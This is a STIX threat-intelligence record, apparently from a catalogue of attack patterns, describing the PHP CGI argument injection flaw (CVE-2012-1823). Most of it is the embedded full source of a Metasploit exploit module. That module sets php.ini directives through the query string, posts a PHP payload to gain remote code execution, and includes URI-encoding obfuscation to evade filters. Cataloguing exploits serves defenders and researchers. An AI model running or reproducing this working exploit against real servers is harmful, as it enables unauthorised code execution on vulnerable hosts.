{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--126b0c51-f217-4c5b-aaea-7742f7384eb2",
    "created": "2024-08-14T17:10:34.103241Z",
    "modified": "2024-08-14T17:10:34.103245Z",
    "name": "PHP CGI Argument Injection",
    "description": " When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability.  This module takes advantage of the -d flag to set php.ini directives to achieve code execution.  From the advisory: \"if there is NO unescaped '=' in the query string the string is split on '+' (encoded space) characters, urldecoded passed to a function that escapes shell metacharacters (the \"encoded in a system-defined manner\" from the RFC) and then passes them to the CGI binary.\" This module can also be used to exploit the plesk 0day disclosed by kingcope and exploited in the wild on June 2013. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/php_cgi_arg_injection.rb",
            "external_id": "php_cgi_arg_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1823"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120503154724/http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/"
        },
        {
            "source_name": "reference",
            "url": "http://kb.parallels.com/en/116241"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PHP CGI Argument Injection',\n        'Description' => %q{\n          When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\n          an argument injection vulnerability.  This module takes advantage of\n          the -d flag to set php.ini directives to achieve code execution.\n\n          From the advisory: \"if there is NO unescaped '=' in the query string,\n          the string is split on '+' (encoded space) characters, urldecoded,\n          passed to a function that escapes shell metacharacters (the \"encoded in\n          a system-defined manner\" from the RFC) and then passes them to the CGI\n          binary.\" This module can also be used to exploit the plesk 0day disclosed\n          by kingcope and exploited in the wild on June 2013.\n        },\n        'Author' => [\n          'egypt', 'hdm', # original msf exploit\n          'jjarmoc',      # added URI encoding obfuscation\n          'kingcope',     # plesk poc\n          'juan vazquez'  # add support for plesk exploitation\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2012-1823'],\n          ['OSVDB', '81633'],\n          ['OSVDB', '93979'],\n          ['EDB', '25986'],\n          ['URL', 'http://web.archive.org/web/20120503154724/http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/'],\n          ['URL', 'http://kb.parallels.com/en/116241']\n        ],\n        'Privileged' => false,\n        'Payload' => {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as an HTTP\n          # response body, so really it's unlimited\n          'Space' => 262144 # 256k\n        },\n        'DisclosureDate' => '2012-05-03',\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [[ 'Automatic', {}]],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [false, 'The URI to request (must be a CGI-handled PHP script)']),\n      OptInt.new('URIENCODING', [true, 'Level of URI URIENCODING and padding (0 for minimum)', 0]),\n      OptBool.new('PLESK', [true, 'Exploit Plesk', false]),\n    ])\n  end\n\n  # php-cgi -h\n  # ...\n  #   -s               Display colour syntax highlighted source.\n  def check\n    vprint_status(\"Checking uri #{uri}\")\n\n    response = send_request_raw({ 'uri' => uri })\n\n    return CheckCode::Unknown('Connection failed.') unless response\n\n    if response.code == 200 && response.body.to_s.lstrip =~ /^<code><span style/i && !datastore['PLESK']\n      return CheckCode::Unknown('Server responded in a way that was ambiguous. Could not determine whether it was vulnerable.')\n    end\n\n    response = send_request_raw({ 'uri' => \"#{uri}?#{create_arg('-s')}\" })\n\n    return CheckCode::Unknown('Connection failed.') unless response\n\n    if response.code == 200 && response.body.to_s.lstrip =~ /^<code><span style/i\n      return CheckCode::Vulnerable\n    end\n\n    if datastore['PLESK'] && response.code == 500\n      return CheckCode::Appears('Server responded with HTTP 500 error')\n    end\n\n    CheckCode::Safe('Server responded indicating it was not vulnerable')\n  end\n\n  def uri\n    if datastore['PLESK']\n      normalize_uri('phppath', 'php')\n    else\n      normalize_uri(target_uri.path).gsub(/\\?.*/, '')\n    end\n  end\n\n  def uri_encoding_level\n    if datastore['PLESK']\n      return 0\n    else\n      return datastore['URIENCODING']\n    end\n  end\n\n  def exploit\n    args = [\n      rand_spaces,\n      create_arg('-d', \"allow_url_include=#{rand_php_ini_true}\"),\n      create_arg('-d', \"safe_mode=#{rand_php_ini_false}\"),\n      create_arg('-d', \"suhosin.simulation=#{rand_php_ini_true}\"),\n      create_arg('-d', 'disable_functions=\"\"'),\n      create_arg('-d', 'open_basedir=none'),\n      create_arg('-d', 'auto_prepend_file=php://input'),\n      create_arg('-d', \"cgi.force_redirect=#{rand_php_ini_false}\"),\n      create_arg('-d', 'cgi.redirect_status_env=0'),\n      rand_opt_equiv('-n')\n    ]\n\n    qs = args.join\n\n    # Has to be all on one line, so gsub out the comments and the newlines\n    payload_oneline = '<?php ' + payload.encoded.gsub(/\\s*#.*$/, '').gsub(\"\\n\", '')\n    send_request_cgi({\n      'method' => 'POST',\n      'global' => true,\n      'uri' => \"#{uri}?#{qs}\",\n      'data' => payload_oneline\n    }, 0.5)\n  rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\n    print_error('The target service is unreachable')\n  rescue ::OpenSSL::SSL::SSLError\n    print_error('The target failed to negotiate SSL, is this really an SSL service?')\n  end\n\n  def create_arg(arg, val = nil)\n    if val\n      val = rand_encode(val)\n      val.gsub!('=', '%3d')   # = must always be encoded\n      val.gsub!('\"', '%22')   # \" too\n    end\n\n    ret = ''\n    ret << rand_spaces\n    ret << rand_opt_equiv(arg)\n    ret << rand_space\n    ret << rand_spaces\n    ret << val.to_s\n    ret << rand_space\n    ret\n  end\n\n  def rand_opt_equiv(opt)\n    # Returns a random equivilant option from mapping at\n    # http://www.php.net/manual/en/features.commandline.options.php\n    opt_equivs = {\n      '-d' => [\n        \"#{rand_dash}#{rand_encode('d')}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode('define')}\"\n      ],\n      '-s' => [\n        \"#{rand_dash}#{rand_encode('s')}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode('syntax-highlight')}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode('syntax-highlighting')}\"\n      ],\n      '-T' => [\n        \"#{rand_dash}#{rand_encode('T')}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode('timing')}\"\n      ],\n      '-n' => [\n        \"#{rand_dash}#{rand_encode('n')}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode('no-php-ini')}\"\n      ]\n    }\n\n    equivs = opt_equivs[opt]\n    equivs ? equivs[rand(opt_equivs[opt].length)] : opt\n  end\n\n  def rand_encode(string, max = string.length)\n    # Randomly URI encode characters from string, up to max times.\n    chars = []\n\n    if max > uri_encoding_level\n      max = uri_encoding_level\n    end\n\n    if string.length == 1\n      if rand(2) > 0\n        chars << 0\n      end\n    elsif max > 0\n      max.times { chars << rand(string.length) }\n    end\n\n    chars.uniq.sort.reverse.each { |index| string[index] = Rex::Text.uri_encode(string[index, 1], 'hex-noslashes') }\n    string\n  end\n\n  def rand_spaces(num = uri_encoding_level)\n    ret = ''\n    num.times do\n      ret << rand_space\n    end\n    ret\n  end\n\n  def rand_space\n    uri_encoding_level > 0 ? ['%20', '%09', '+'][rand(3)] : '+'\n  end\n\n  def rand_dash\n    uri_encoding_level > 0 ? ['-', '%2d', '%2D'][rand(3)] : '-'\n  end\n\n  def rand_php_ini_false\n    Rex::Text.to_rand_case([ '0', 'off', 'false' ][rand(3)])\n  end\n\n  def rand_php_ini_true\n    Rex::Text.to_rand_case([ '1', 'on', 'true' ][rand(3)])\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-03",
    "x_mitre_platforms": [
        "php'"
    ]
}